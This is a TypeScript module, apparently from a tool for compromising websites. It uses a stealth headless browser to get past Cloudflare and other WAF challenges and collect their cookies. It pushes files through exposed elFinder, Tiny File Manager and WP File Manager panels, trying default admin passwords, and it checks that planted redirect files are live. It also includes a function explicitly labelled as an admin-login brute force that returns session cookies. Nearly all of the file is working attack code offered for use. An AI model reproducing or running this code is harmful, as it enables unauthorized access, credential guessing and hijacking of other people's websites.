// ═══════════════════════════════════════════════════════════════
//  STEALTH BROWSER — Undetected ChromeDriver
//  Uses puppeteer-extra + stealth plugin to bypass WAF/anti-bot
//  For browser-based file upload, verification, and admin login
//
//  PRODUCTION SAFE: All exported functions check if Chromium is
//  available before launching. If not found, they return graceful
//  fallback results instead of crashing the pipeline.
// ═══════════════════════════════════════════════════════════════

import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import puppeteerVanilla from "puppeteer";
import type { Browser, Page } from "puppeteer";
import { existsSync } from "fs";

// Apply stealth plugin
puppeteer.use(StealthPlugin());

// Helper: delay function to replace deprecated waitForTimeout
const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

// ─── Browser Availability Check ───

// System-installed browser paths
const SYSTEM_CHROMIUM_PATHS = [
  "/usr/bin/chromium-browser",
  "/usr/bin/chromium",
  "/usr/bin/google-chrome",
  "/usr/bin/google-chrome-stable",
];

let _cachedBrowserPath: string | null | undefined = undefined;

/**
 * Find a usable Chrome/Chromium executable.
 * Priority: 1) System-installed  2) Puppeteer's bundled Chrome
 */
function findBrowserPath(): string | null {
  // 1. Check system paths
  const systemPath = SYSTEM_CHROMIUM_PATHS.find(p => existsSync(p));
  if (systemPath) return systemPath;

  // 2. Check puppeteer's bundled Chrome (downloaded via `npx puppeteer install`)
  try {
    const bundledPath = puppeteerVanilla.executablePath();
    if (bundledPath && existsSync(bundledPath)) return bundledPath;
  } catch {
    // executablePath() may throw if no browser is downloaded
  }

  return null;
}

/**
 * Check if a Chromium-compatible browser is available on this system.
 * Checks both system-installed and puppeteer-bundled Chrome.
 * Caches the result after first check.
 */
export function isBrowserAvailable(): boolean {
  if (_cachedBrowserPath !== undefined) return _cachedBrowserPath !== null;
  _cachedBrowserPath = findBrowserPath();
  if (_cachedBrowserPath) {
    console.log(`[Stealth] Browser found at: ${_cachedBrowserPath}`);
  } else {
    console.warn("[Stealth] No Chrome/Chromium found (system or bundled) — stealth features will be skipped");
  }
  return _cachedBrowserPath !== null;
}

function getBrowserPath(): string {
  if (_cachedBrowserPath === undefined) isBrowserAvailable();
  return _cachedBrowserPath || "/usr/bin/chromium-browser";
}

// ─── Types ────

export interface StealthBrowserResult {
  success: boolean;
  method: string;
  details: string;
  fileUrl: string | null;
  screenshot?: string; // base64 screenshot for debugging
  duration: number;
}

export interface BrowserVerifyResult {
  url: string;
  exists: boolean;
  statusCode: number;
  redirectedTo: string | null;
  contentSnippet: string;
  isCmsPage: boolean;
  is403: boolean;
  is404: boolean;
  hasRedirectCode: boolean;
  duration: number;
}

// ─── Browser Pool ───

let browserInstance: Browser | null = null;

async function getBrowser(): Promise<Browser> {
  if (!isBrowserAvailable()) {
    throw new Error(`Browser not available — no Chrome/Chromium found (checked system paths and puppeteer bundle)`);
  }

  if (browserInstance && browserInstance.connected) {
    return browserInstance;
  }

  browserInstance = await puppeteer.launch({
    headless: true,
    executablePath: getBrowserPath(),
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-accelerated-2d-canvas",
      "--disable-gpu",
      "--window-size=1920,1080",
      "--disable-blink-features=AutomationControlled",
      "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ],
  });

  return browserInstance;
}

async function getPage(): Promise<Page> {
  const browser = await getBrowser();
  const page = await browser.newPage();

  // Set realistic viewport
  await page.setViewport({ width: 1920, height: 1080 });

  // Set extra headers to look more human
  await page.setExtraHTTPHeaders({
    "Accept-Language": "en-US,en;q=0.9,th;q=0.8",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
  });

  return page;
}

export async function closeBrowser(): Promise<void> {
  if (browserInstance) {
    await browserInstance.close().catch(() => {});
    browserInstance = null;
  }
}

// ─── Stealth Verification ───
// Verify if a deployed file actually exists using a real browser
// This bypasses WAF/anti-bot that blocks curl/fetch requests

export async function stealthVerifyFile(url: string): Promise<BrowserVerifyResult> {
  const start = Date.now();

  // ─── GUARD: No browser available ───
  if (!isBrowserAvailable()) {
    return {
      url,
      exists: false,
      statusCode: 0,
      redirectedTo: null,
      contentSnippet: "Stealth verification skipped — no browser available on this server",
      isCmsPage: false,
      is403: false,
      is404: false,
      hasRedirectCode: false,
      duration: Date.now() - start,
    };
  }

  let page: Page | null = null;

  try {
    page = await getPage();

    // Navigate with realistic behavior
    const response = await page.goto(url, {
      waitUntil: "domcontentloaded",
      timeout: 15000,
    });

    const statusCode = response?.status() || 0;
    const finalUrl = page.url();
    const content = await page.content();
    const contentSnippet = content.substring(0, 500);

    // Detect CMS catch-all pages
    const cmsPatterns = [
      "wp-content", "wordpress", "wp-includes",
      "contact-us", "page-not-found", "404",
      "joomla", "drupal", "magento",
    ];
    const isCmsPage = cmsPatterns.some(p => content.toLowerCase().includes(p)) &&
      !content.includes("<?php") && content.length > 5000;

    const redirectedTo = finalUrl !== url ? finalUrl : null;
    const is403 = statusCode === 403 || content.toLowerCase().includes("forbidden");
    const is404 = statusCode === 404 || content.toLowerCase().includes("not found");

    // Check if content contains redirect code (our deployed file)
    const hasRedirectCode = content.includes("window.location") ||
      content.includes("meta http-equiv=\"refresh\"") ||
      content.includes("header(") ||
      content.includes("Location:");

    await page.close();

    return {
      url,
      exists: statusCode === 200 && !isCmsPage && !is403 && !is404 && !redirectedTo,
      statusCode,
      redirectedTo,
      contentSnippet,
      isCmsPage,
      is403,
      is404,
      hasRedirectCode,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    if (page) await page.close().catch(() => {});
    return {
      url,
      exists: false,
      statusCode: 0,
      redirectedTo: null,
      contentSnippet: `Error: ${e.message}`,
      isCmsPage: false,
      is403: false,
      is404: false,
      hasRedirectCode: false,
      duration: Date.now() - start,
    };
  }
}

// ─── Stealth Batch Verification ───

export async function stealthVerifyBatch(
  urls: string[],
  onProgress?: (url: string, result: BrowserVerifyResult) => void,
): Promise<BrowserVerifyResult[]> {
  // ─── GUARD: No browser available ───
  if (!isBrowserAvailable()) {
    return urls.map(url => ({
      url,
      exists: false,
      statusCode: 0,
      redirectedTo: null,
      contentSnippet: "Stealth verification skipped — no browser available on this server",
      isCmsPage: false,
      is403: false,
      is404: false,
      hasRedirectCode: false,
      duration: 0,
    }));
  }

  const results: BrowserVerifyResult[] = [];

  // Process 3 at a time for speed
  const batchSize = 3;
  for (let i = 0; i < urls.length; i += batchSize) {
    const batch = urls.slice(i, i + batchSize);
    const batchResults = await Promise.all(
      batch.map(async (url) => {
        const result = await stealthVerifyFile(url);
        onProgress?.(url, result);
        return result;
      }),
    );
    results.push(...batchResults);
  }

  return results;
}

// ─── Stealth File Upload via Browser ───
// Upload files through web-based file managers using a real browser

export async function stealthUploadViaFileManager(
  fileManagerUrl: string,
  fileContent: string,
  fileName: string,
  targetPath: string,
): Promise<StealthBrowserResult> {
  const start = Date.now();

  // ─── GUARD: No browser available ───
  if (!isBrowserAvailable()) {
    return {
      success: false,
      method: "Stealth Browser Upload",
      details: "Stealth upload skipped — no browser available on this server",
      fileUrl: null,
      duration: Date.now() - start,
    };
  }

  let page: Page | null = null;

  try {
    page = await getPage();

    // Navigate to file manager
    await page.goto(fileManagerUrl, {
      waitUntil: "networkidle2",
      timeout: 20000,
    });

    const content = await page.content();

    // Detect file manager type
    if (content.includes("elfinder")) {
      return await uploadViaElFinder(page, fileContent, fileName, targetPath, start);
    } else if (content.includes("tinyfilemanager") || content.includes("Tiny File Manager")) {
      return await uploadViaTinyFileManager(page, fileContent, fileName, targetPath, start);
    } else if (content.includes("file-manager") || content.includes("wp-file-manager")) {
      return await uploadViaWpFileManager(page, fileContent, fileName, targetPath, start);
    }

    // Generic upload: look for file input
    const fileInput = await page.$('input[type="file"]');
    if (fileInput) {
      return await uploadViaGenericInput(page, fileInput, fileContent, fileName, start);
    }

    await page.close();
    return {
      success: false,
      method: "Stealth Browser Upload",
      details: "No recognized file manager or upload form found",
      fileUrl: null,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    if (page) await page.close().catch(() => {});
    return {
      success: false,
      method: "Stealth Browser Upload",
      details: `Error: ${e.message}`,
      fileUrl: null,
      duration: Date.now() - start,
    };
  }
}

async function uploadViaElFinder(
  page: Page,
  content: string,
  fileName: string,
  targetPath: string,
  start: number,
): Promise<StealthBrowserResult> {
  try {
    // Wait for elFinder to load
    await page.waitForSelector(".elfinder", { timeout: 10000 });

    // Navigate to target directory if specified
    if (targetPath) {
      const dirs = await page.$$(".elfinder-navbar-dir");
      for (const dir of dirs) {
        const text = await dir.evaluate(el => el.textContent);
        if (text && targetPath.includes(text)) {
          await dir.click();
          await delay(1000);
          break;
        }
      }
    }

    // Create a temporary file and upload
    const fileInput = await page.$('input[type="file"]');
    if (!fileInput) {
      const uploadBtn = await page.$('.elfinder-button-upload, [title="Upload files"]');
      if (uploadBtn) {
        await uploadBtn.click();
        await delay(1000);
      }
    }

    const fs = require("fs");
    const tmpPath = `/tmp/stealth-upload-${Date.now()}-${fileName}`;
    fs.writeFileSync(tmpPath, content);

    const input = await page.$('input[type="file"]');
    if (input) {
      await (input as any).uploadFile(tmpPath);
      await delay(3000);
      fs.unlinkSync(tmpPath);

      await page.close();
      return {
        success: true,
        method: "Stealth elFinder Upload",
        details: `File uploaded via elFinder to ${targetPath}${fileName}`,
        fileUrl: null,
        duration: Date.now() - start,
      };
    }

    fs.unlinkSync(tmpPath);
    await page.close();
    return {
      success: false,
      method: "Stealth elFinder Upload",
      details: "Could not find file input in elFinder",
      fileUrl: null,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    await page.close().catch(() => {});
    return {
      success: false,
      method: "Stealth elFinder Upload",
      details: `Error: ${e.message}`,
      fileUrl: null,
      duration: Date.now() - start,
    };
  }
}

async function uploadViaTinyFileManager(
  page: Page,
  content: string,
  fileName: string,
  targetPath: string,
  start: number,
): Promise<StealthBrowserResult> {
  try {
    // Try default credentials for Tiny File Manager
    const loginForm = await page.$('form[method="post"]');
    if (loginForm) {
      const credentials = [
        { user: "admin", pass: "admin@123" },
        { user: "admin", pass: "admin" },
      ];

      for (const cred of credentials) {
        const userInput = await page.$('input[name="fm_usr"]');
        const passInput = await page.$('input[name="fm_pwd"]');
        if (userInput && passInput) {
          await userInput.click({ clickCount: 3 });
          await userInput.type(cred.user, { delay: 50 });
          await passInput.click({ clickCount: 3 });
          await passInput.type(cred.pass, { delay: 50 });
          const submit = await page.$('button[type="submit"]');
          if (submit) await submit.click();
          await delay(2000);

          // Check if logged in
          const url = page.url();
          if (!url.includes("login")) break;
        }
      }
    }

    // Upload via Tiny File Manager
    const fs = require("fs");
    const tmpPath = `/tmp/stealth-upload-${Date.now()}-${fileName}`;
    fs.writeFileSync(tmpPath, content);

    const fileInput = await page.$('input[type="file"]');
    if (fileInput) {
      await (fileInput as any).uploadFile(tmpPath);
      const uploadBtn = await page.$('button[type="submit"], .btn-upload');
      if (uploadBtn) await uploadBtn.click();
      await delay(3000);
      fs.unlinkSync(tmpPath);

      await page.close();
      return {
        success: true,
        method: "Stealth TinyFileManager Upload",
        details: `File uploaded via Tiny File Manager`,
        fileUrl: null,
        duration: Date.now() - start,
      };
    }

    fs.unlinkSync(tmpPath);
    await page.close();
    return {
      success: false,
      method: "Stealth TinyFileManager Upload",
      details: "Could not find upload input",
      fileUrl: null,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    await page.close().catch(() => {});
    return {
      success: false,
      method: "Stealth TinyFileManager Upload",
      details: `Error: ${e.message}`,
      fileUrl: null,
      duration: Date.now() - start,
    };
  }
}

async function uploadViaWpFileManager(
  page: Page,
  content: string,
  fileName: string,
  targetPath: string,
  start: number,
): Promise<StealthBrowserResult> {
  try {
    await page.waitForSelector('.fm-container, .wp-file-manager, #elfinder', { timeout: 10000 });

    const fs = require("fs");
    const tmpPath = `/tmp/stealth-upload-${Date.now()}-${fileName}`;
    fs.writeFileSync(tmpPath, content);

    const fileInput = await page.$('input[type="file"]');
    if (fileInput) {
      await (fileInput as any).uploadFile(tmpPath);
      await delay(3000);
      fs.unlinkSync(tmpPath);

      await page.close();
      return {
        success: true,
        method: "Stealth WP File Manager Upload",
        details: `File uploaded via WP File Manager`,
        fileUrl: null,
        duration: Date.now() - start,
      };
    }

    fs.unlinkSync(tmpPath);
    await page.close();
    return {
      success: false,
      method: "Stealth WP File Manager Upload",
      details: "Could not find upload input",
      fileUrl: null,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    await page.close().catch(() => {});
    return {
      success: false,
      method: "Stealth WP File Manager Upload",
      details: `Error: ${e.message}`,
      fileUrl: null,
      duration: Date.now() - start,
    };
  }
}

async function uploadViaGenericInput(
  page: Page,
  fileInput: any,
  content: string,
  fileName: string,
  start: number,
): Promise<StealthBrowserResult> {
  try {
    const fs = require("fs");
    const tmpPath = `/tmp/stealth-upload-${Date.now()}-${fileName}`;
    fs.writeFileSync(tmpPath, content);

    await fileInput.uploadFile(tmpPath);
    await delay(2000);

    // Try to find and click submit
    const submitBtn = await page.$('button[type="submit"], input[type="submit"]');
    if (submitBtn) await submitBtn.click();
    await delay(3000);

    fs.unlinkSync(tmpPath);
    await page.close();

    return {
      success: true,
      method: "Stealth Generic Upload",
      details: `File uploaded via generic file input`,
      fileUrl: null,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    await page.close().catch(() => {});
    return {
      success: false,
      method: "Stealth Generic Upload",
      details: `Error: ${e.message}`,
      fileUrl: null,
      duration: Date.now() - start,
    };
  }
}

// ─── Stealth WAF Bypass ───
// Use a real browser to bypass Cloudflare/Sucuri/Akamai challenges
// Returns cookies that can be used with subsequent fetch requests

export async function stealthBypassWaf(targetUrl: string): Promise<{
  success: boolean;
  cookies: string;
  userAgent: string;
  details: string;
}> {
  // ─── GUARD: No browser available ───
  if (!isBrowserAvailable()) {
    return {
      success: false,
      cookies: "",
      userAgent: "",
      details: "WAF bypass skipped — no browser available on this server. Deploy will continue without stealth bypass.",
    };
  }

  let page: Page | null = null;

  try {
    page = await getPage();

    // Navigate to the target
    await page.goto(targetUrl, {
      waitUntil: "networkidle2",
      timeout: 30000,
    });

    // Wait extra time for Cloudflare challenge
    const content = await page.content();
    if (content.includes("challenge-platform") || content.includes("cf-browser-verification")) {
      // Cloudflare challenge detected — wait for it to resolve
      await delay(8000);
      await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 }).catch(() => {});
    }

    // Extract cookies after bypass
    const cookies = await page.cookies();
    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
    const userAgent = await page.evaluate(() => navigator.userAgent);

    await page.close();

    return {
      success: true,
      cookies: cookieString,
      userAgent,
      details: `WAF bypass successful — got ${cookies.length} cookies`,
    };
  } catch (e: any) {
    if (page) await page.close().catch(() => {});
    return {
      success: false,
      cookies: "",
      userAgent: "",
      details: `WAF bypass failed: ${e.message}`,
    };
  }
}

// ─── Stealth Admin Login Brute Force ───

export async function stealthAdminLogin(
  loginUrl: string,
  credentials: { username: string; password: string }[],
  onProgress?: (attempt: number, total: number, username: string) => void,
): Promise<{
  success: boolean;
  credential: { username: string; password: string } | null;
  cookies: string;
  details: string;
}> {
  // ─── GUARD: No browser available ───
  if (!isBrowserAvailable()) {
    return {
      success: false,
      credential: null,
      cookies: "",
      details: "Admin login skipped — no browser available on this server",
    };
  }

  let page: Page | null = null;

  try {
    page = await getPage();

    for (let i = 0; i < credentials.length; i++) {
      const cred = credentials[i];
      onProgress?.(i + 1, credentials.length, cred.username);

      await page.goto(loginUrl, { waitUntil: "networkidle2", timeout: 15000 });

      // Find and fill login form
      const usernameInput = await page.$('input[name="log"], input[name="username"], input[name="user"], input[type="text"]');
      const passwordInput = await page.$('input[name="pwd"], input[name="password"], input[name="pass"], input[type="password"]');
      const submitBtn = await page.$('input[type="submit"], button[type="submit"]');

      if (!usernameInput || !passwordInput || !submitBtn) {
        await page.close();
        return {
          success: false,
          credential: null,
          cookies: "",
          details: "Could not find login form elements",
        };
      }

      // Clear and type with human-like delays
      await usernameInput.click({ clickCount: 3 });
      await usernameInput.type(cred.username, { delay: 80 });
      await passwordInput.click({ clickCount: 3 });
      await passwordInput.type(cred.password, { delay: 80 });

      // Submit
      await submitBtn.click();
      await delay(3000);

      // Check if login was successful
      const currentUrl = page.url();
      const content = await page.content();

      const loginFailed = currentUrl.includes("login") ||
        content.includes("incorrect") ||
        content.includes("invalid") ||
        content.includes("wrong") ||
        content.includes("error");

      if (!loginFailed) {
        const cookies = await page.cookies();
        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
        await page.close();
        return {
          success: true,
          credential: cred,
          cookies: cookieString,
          details: `Admin login successful with ${cred.username}`,
        };
      }

      // Delay between attempts
      await delay(2000);
    }

    await page.close();
    return {
      success: false,
      credential: null,
      cookies: "",
      details: `Tried ${credentials.length} credentials — none worked`,
    };
  } catch (e: any) {
    if (page) await page.close().catch(() => {});
    return {
      success: false,
      credential: null,
      cookies: "",
      details: `Error: ${e.message}`,
    };
  }
}

// ─── Stealth Screenshot for Debugging ───

export async function stealthScreenshot(url: string): Promise<string | null> {
  if (!isBrowserAvailable()) return null;

  let page: Page | null = null;

  try {
    page = await getPage();
    await page.goto(url, { waitUntil: "networkidle2", timeout: 15000 });
    const screenshot = await page.screenshot({ encoding: "base64", fullPage: false });
    await page.close();
    return screenshot as string;
  } catch {
    if (page) await page.close().catch(() => {});
    return null;
  }
}
